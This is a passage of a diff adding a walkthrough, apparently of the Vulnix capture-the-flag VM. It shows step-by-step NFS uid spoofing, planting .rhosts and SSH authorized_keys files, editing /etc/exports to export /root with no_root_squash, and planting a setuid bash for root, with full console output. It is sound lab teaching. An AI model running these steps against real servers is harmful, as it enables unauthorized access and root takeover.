+  echo hello > /mnt/home/vulnix/hello.txt
+  chmod 600 /mnt/home/vulnix/hello.txt
+  ls -l /mnt/home/vulnix/hello.txt
+
+
+Running this gives the following. Note that listing :file:`/home/vulnix` gets a permission denied. And note the uid/gid = 4294967294/4294967294 
+
+.. code-block:: console
+
+  hacker@kali:~/local/pentest/phouse/vulnix$ SUDO=$(which sudo)
+  hacker@kali:~/local/pentest/phouse/vulnix$ [[ "$USER" == "root" ]] && SUDO=
+  hacker@kali:~/local/pentest/phouse/vulnix$ # nfs4 mounts at root
+  hacker@kali:~/local/pentest/phouse/vulnix$ T=192.168.1.103
+  hacker@kali:~/local/pentest/phouse/vulnix$ MP=/mnt
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO mount -t nfs4 $T:/ $MP
+  hacker@kali:~/local/pentest/phouse/vulnix$ ls -laR $MP
+  /mnt:
+  total 12
+  drwxr-xr-x 22 4294967294 4294967294 4096 Sep  2  2012 .
+  drwxr-xr-x 25 root       root       4096 Apr 28 21:01 ..
+  drwxr-xr-x  4 4294967294 4294967294 4096 Sep  2  2012 home
+
+  /mnt/home:
+  total 12
+  drwxr-xr-x  4 4294967294 4294967294 4096 Sep  2  2012 .
+  drwxr-xr-x 22 4294967294 4294967294 4096 Sep  2  2012 ..
+  drwxr-x---  2 4294967294 4294967294 4096 Sep  2  2012 vulnix
+  ls: cannot open directory /mnt/home/vulnix: Permission denied
+  hacker@kali:~/local/pentest/phouse/vulnix$ # but uid/gid 2008/2008 does get access
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO groupadd --gid 2008 vulnix
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO useradd -m vulnix --uid 2008 --gid 2008
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO passwd vulnix
+  Enter new UNIX password: 
+  Retype new UNIX password: 
+  passwd: password updated successfully
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO chsh -s /bin/bash vulnix
+  hacker@kali:~/local/pentest/phouse/vulnix$ su - vulnix
+  Password: 
+  vulnix@kali:~$ ls -laR /mnt
+  /mnt:
+  total 12
+  drwxr-xr-x 22 4294967294 4294967294 4096 Sep  2  2012 .
+  drwxr-xr-x 25 root       root       4096 Apr 28 21:01 ..
+  drwxr-xr-x  4 4294967294 4294967294 4096 Sep  2  2012 home
+
+  /mnt/home:
+  total 12
+  drwxr-xr-x  4 4294967294 4294967294 4096 Sep  2  2012 .
+  drwxr-xr-x 22 4294967294 4294967294 4096 Sep  2  2012 ..
+  drwxr-x---  2 4294967294 4294967294 4096 Sep  2  2012 vulnix
+
+  /mnt/home/vulnix:
+  total 20
+  drwxr-x--- 2 4294967294 4294967294 4096 Sep  2  2012 .
+  drwxr-xr-x 4 4294967294 4294967294 4096 Sep  2  2012 ..
+  -rw-r--r-- 1 4294967294 4294967294  220 Apr  3  2012 .bash_logout
+  -rw-r--r-- 1 4294967294 4294967294 3486 Apr  3  2012 .bashrc
+  -rw-r--r-- 1 4294967294 4294967294  675 Apr  3  2012 .profile
+  vulnix@kali:~$ # and local vulnix user can write to the nfs share
+  vulnix@kali:~$ echo hello > /mnt/home/vulnix/hello.txt
+  vulnix@kali:~$ chmod 600 /mnt/home/vulnix/hello.txt
+  vulnix@kali:~$ ls -l /mnt/home/vulnix/hello.txt
+  -rw------- 1 4294967294 4294967294 6 Apr 29 23:54 /mnt/home/vulnix/hello.txt
+  vulnix@kali:~$ exit
+  logout
+  hacker@kali:~/local/pentest/phouse/vulnix$ 
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO umount /mnt
+
+
+Mounting nfs3 style
+^^^^^^^^^^^^^^^^^^^
+
+So try an nfs3 mount where we eventually see uid/gid 2008/2008:
+
+.. code-block:: bash
+
+  $SUDO mount -t nfs -o vers=3,nolock $T:/home/vulnix /mnt
+  ls -laR /mnt
+  su - vulnix
+  ls -laR /mnt
+  exit
+  $SUDO umount /mnt
+
+Running this gives:
+
+.. code-block:: console
+
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO mount -t nfs -o vers=3,nolock $T:/home/vulnix /mnt
+  hacker@kali:~/local/pentest/phouse/vulnix$ ls -laR /mnt
+  ls: cannot open directory /mnt: Permission denied
+  hacker@kali:~/local/pentest/phouse/vulnix$ su - vulnix
+  Password: 
+  vulnix@kali:~$ ls -laR /mnt
+  /mnt:
+  total 24
+  drwxr-x---  2 vulnix vulnix 4096 Apr 29 23:54 .
+  drwxr-xr-x 25 root   root   4096 Apr 28 21:01 ..
+  -rw-r--r--  1 vulnix vulnix  220 Apr  3  2012 .bash_logout
+  -rw-r--r--  1 vulnix vulnix 3486 Apr  3  2012 .bashrc
+  -rw-------  1 vulnix vulnix    6 Apr 29 23:54 hello.txt
+  -rw-r--r--  1 vulnix vulnix  675 Apr  3  2012 .profile
+  vulnix@kali:~$ exit
+  logout
+  hacker@kali:~/local/pentest/phouse/vulnix$ $SUDO umount /mnt
+
+
+Getting access the easy way: ``nfspysh`` and ``rsh``
+----------------------------------------------------
+
+Kali defaults ``rsh`` to running OpenSSL's ``ssh``; to use the "real" ``rsh`` install rsh-client:
+
+.. code-block:: bash
+
+  $SUDO apt-get install rsh-client
+  echo "+ +" > rhosts
+  $SUDO nfspysh -o server=$IP:/home/vulnix -c 'put rhosts .rhosts; chmod 600 .rhosts'
+
+That's it! Now you have password-less access to the vulnix user account on the Vulnix server. So proceed with the exploit:
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ # check remote vulnix user sudo rights
+  (vulnix)hacker@kali:~$ rsh -l vulnix $IP 'sudo -l'
+  Matching Defaults entries for vulnix on this host:
+      env_reset,
+      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+  User vulnix may run the following commands on this host:
+      (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+  (vulnix)hacker@kali:~$ rsh -l vulnix $IP
+  ###################### SNIP ######################
+  vulnix@vulnix:~$ # vulnix can edit /etc/exports, so export /root
+  vulnix@vulnix:~$ sudoedit /etc/exports
+  ###################### SNIP ######################
+  vulnix@vulnix:~$ cat /etc/exports
+  ###################### SNIP ######################
+  /home/vulnix	*(rw,no_root_squash)
+  /root		*(rw,no_root_squash)
+  vulnix@vulnix:~$ exit
+  logout
+  rlogin: connection closed.
+  (vulnix)hacker@kali:~$ # now we need to restart nfs by rebooting the VM
+  (vulnix)hacker@kali:~$ # ... waiting for reboot ...
+
+After the Vulnix reboot:
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ $SUDO nfspysh -o server=$IP:/root -c 'ls'
+  /:
+  040700      0      0        4096 2012-09-02 10:58:01 .cache
+  100600      0      0         710 2012-09-02 10:47:19 .viminfo
+  040700      0      0        4096 2012-09-02 12:08:28 .
+  100400      0      0          33 2012-09-02 10:57:07 trophy.txt
+  100644      0      0         140 2012-04-19 02:15:14 .profile
+  100600      0      0           0 2012-09-02 12:08:28 .bash_history
+  040700      0      0        4096 2012-09-02 12:08:28 ..
+  100644      0      0        3106 2012-04-19 02:15:14 .bashrc
+  (vulnix)hacker@kali:~$ $SUDO nfspysh -o server=$IP:/root -c 'get trophy.txt'
+  (vulnix)hacker@kali:~$ cat trophy.txt 
+  cc614640424f5bd60ce5d5264899c3be
+
+At this point if you want to clean up you'd need to:
+
+.. code-block:: bash
+
+  [[ "$USER" != "root" ]] && deactivate
+  [[ "$USER" != "root" ]] && rmvirtualenv vulnix
+  $SUDO apt-get remove rsh-client -y
+
+Getting access (and root) the harder way: ``mount.nfs`` and ``ssh``
+-------------------------------------------------------------------
+
+This is basically the same exploit as above with the exception of using ``ssh`` vs. ``rsh`` and not using the ``nfspysh`` tool (and using the normal ``mount.nfs`` command). Why bother? Normally ``rsh`` wouldn't be installed (just like Kali Linux), so it shouldn't be available on target hosts. And ``nfspysh`` wouldn't be available on typical linux hosts (like Debian). So it's useful to learn the "normal" alternative approach.
+
+Here upload the :file:`.ssh/authorized_keys` file to get password-less SSH access; as before ``sudo -l`` shows vulnix can execute ``sudoedit /etc/exports``; then :file:`/etc/exports` is modified to add :file:`/root` and all mounts are changed to ``no_root_squash`` finally giving us access to the trophy. This approach is more complex for two reasons: first, SSH keys must be generated; second ``mount.nfs`` access requires a Kali local account with uid 2008 to get access. Also, we'll show how to get root through the NFS configuration issue.
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ /sbin/showmount -e $IP
+  Export list for 192.168.1.103:
+  /home/vulnix *
+  (vulnix)hacker@kali:~$ # Trying nfs mount gets nfs4 and no access
+  (vulnix)hacker@kali:~$ $SUDO mkdir /mnt/nfs
+  (vulnix)hacker@kali:~$ $SUDO mount.nfs  $IP:/ /mnt/nfs
+  (vulnix)hacker@kali:~$ $SUDO ls -l /mnt/nfs/home/
+  total 4
+  drwxr-x--- 2 4294967294 4294967294 4096 Apr 15 23:14 vulnix
+  (vulnix)hacker@kali:~$ $SUDO ls -al /mnt/nfs/home/vulnix
+  ls: cannot open directory /mnt/nfs/home/vulnix: Permission denied
+  (vulnix)hacker@kali:~$ # create local copy of remote vulnix user
+  (vulnix)hacker@kali:~$ $SUDO groupadd --gid 2008 vulnix
+  (vulnix)hacker@kali:~$ $SUDO useradd -m vulnix --uid 2008 --gid 2008
+  (vulnix)hacker@kali:~$ $SUDO passwd vulnix
+  Enter new UNIX password: 
+  Retype new UNIX password: 
+  passwd: password updated successfully
+  (vulnix)hacker@kali:~$ $SUDO chsh -s /bin/bash vulnix
+  (vulnix)hacker@kali:~$ su - vulnix
+  Password: 
+  vulnix@kali:~$ # local "vulnix" uid 2008 can access nfs /home/vulnix
+  vulnix@kali:~$ ls -al /mnt/nfs/home/vulnix
+  total 20
+  drwxr-x--- 2 4294967294 4294967294 4096 Apr 15 23:14 .
+  drwxr-xr-x 4 4294967294 4294967294 4096 Sep  2  2012 ..
+  -rw-r--r-- 1 4294967294 4294967294  220 Apr  3  2012 .bash_logout
+  -rw-r--r-- 1 4294967294 4294967294 3486 Apr  3  2012 .bashrc
+  -rw-r--r-- 1 4294967294 4294967294  675 Apr  3  2012 .profile
+  vulnix@kali:~$ # create ssh keys for password-less access from kali
+  vulnix@kali:~$ ssh-keygen
+  Generating public/private rsa key pair.
+  Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): 
+  Created directory '/home/vulnix/.ssh'.
+  Enter passphrase (empty for no passphrase): 
+  Enter same passphrase again: 
+  Your identification has been saved in /home/vulnix/.ssh/id_rsa.
+  Your public key has been saved in /home/vulnix/.ssh/id_rsa.pub.
+  ###################### SNIP ######################
+  vulnix@kali:~$ mkdir -m 700 /mnt/nfs/home/vulnix/.ssh
+  vulnix@kali:~$ ls -ld /mnt/nfs/home/vulnix/.ssh
+  drwx------ 2 4294967294 4294967294 4096 Apr 18 13:37 /mnt/nfs/home/vulnix/.ssh
+  vulnix@kali:~$ cp --preserve ~/.ssh/id_rsa.pub /mnt/nfs/home/vulnix/.ssh/authorized_keys
+  vulnix@kali:~$ IP=192.168.1.103
+  vulnix@kali:~$ ssh $IP ls -al .ssh
+  ###################### SNIP ######################
+  total 20
+  drwx------ 2 vulnix vulnix 4096 Apr 16 21:05 .
+  drwxr-x--- 4 vulnix vulnix 4096 Apr 16 21:07 ..
+  -rw-r--r-- 1 vulnix vulnix  393 Apr 16 20:42 authorized_keys
+  vulnix@kali:~$ # check remote vulnix user sudo rights
+  vulnix@kali:~$ ssh $IP sudo -l
+  Matching 'Defaults' entries for vulnix on this host:
+      env_reset,
+      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+  User vulnix may run the following commands on this host:
+      (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+  vulnix@kali:~$ # vulnix can edit /etc/exports - export /root, all exports no_root_squash
+  vulnix@kali:~$ ssh -t $IP sudoedit /etc/exports
+  ###################### SNIP ######################
+  vulnix@kali:~$ ssh -t $IP cat /etc/exports
+  ###################### SNIP ######################
+  /home/vulnix	*(rw,no_root_squash)
+  /root		*(rw,no_root_squash)
+  vulnix@kali:~$ exit
+  logout
+  (vulnix)hacker@kali:~$ $SUDO umount.nfs /mnt/nfs
+  (vulnix)hacker@kali:~$ # now we need to restart nfs by rebooting the VM
+  (vulnix)hacker@kali:~$ # ... waiting for reboot ...
+
+At this point we can do one of two things: get the trophy from /root, or switch to root. First we show how to get the trophy:
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ $SUDO mount.nfs $IP:/ /mnt/nfs
+  (vulnix)hacker@kali:~$ $SUDO ls /mnt/nfs/root
+  trophy.txt
+  (vulnix)hacker@kali:~$ $SUDO cat /mnt/nfs/root/trophy.txt
+  cc614640424f5bd60ce5d5264899c3be
+
+At this point we'll throw in an extra: root access for vulnix.
+
+.. code-block:: console
+
+  (vulnix)hacker@kali:~$ su - vulnix
+  Password: 
+  vulnix@kali:~$ IP=192.168.1.103
+  vulnix@kali:~$ ssh $IP 'cp /bin/bash bash2'
+  vulnix@kali:~$ ssh $IP ls -l
+  total 900
+  -rwxr-xr-x 1 vulnix vulnix 920788 Apr 18 22:04 bash2
+  vulnix@kali:~$ exit
+  logout
+  (vulnix)hacker@kali:~$ $SUDO cp  /mnt/nfs/home/vulnix/bash2 /mnt/nfs/home/vulnix/bash
+  (vulnix)hacker@kali:~$ $SUDO chmod +s /mnt/nfs/home/vulnix/bash
+  (vulnix)hacker@kali:~$ su - vulnix
+  Password: 
+  vulnix@kali:~$ IP=192.168.1.103
+  vulnix@kali:~$ ssh $IP
+  vulnix@vulnix:~$ ./bash -p
+  bash-4.2# id
+  uid=2008(vulnix) gid=2008(vulnix) euid=0(root) egid=0(root) groups=0(root),2008(vulnix)
+  bash-4.2# ls -l
+  total 1800
+  -rwsr-sr-x 1 root   root   920788 Apr 18 22:09 bash
+  -rwxr-xr-x 1 vulnix vulnix 920788 Apr 18 22:04 bash2
+  bash-4.2# cat /root/trophy.txt
+  cc614640424f5bd60ce5d5264899c3be
+
+
+At this point if you want to clean up you'd need to:
+
+.. code-block:: bash
+
+  bash-4.2# exit
+  exit
+  vulnix@vulnix:~$ exit
+  logout
+  Connection to 192.168.1.103 closed.
+  vulnix@kali:~$ exit
+  logout
+  (vulnix)hacker@kali:~$ $SUDO umount.nfs /mnt/nfs
+  (vulnix)hacker@kali:~$ [[ "$USER" != "root" ]] && deactivate
+  hacker@kali:~$ [[ "$USER" != "root" ]] && rmvirtualenv vulnix
+  Removing vulnix...
+  hacker@kali:~$ $SUDO userdel -r vulnix
+  userdel: vulnix mail spool (/var/mail/vulnix) not found
+  hacker@kali:~$ $SUDO rmdir /mnt/nfs
+
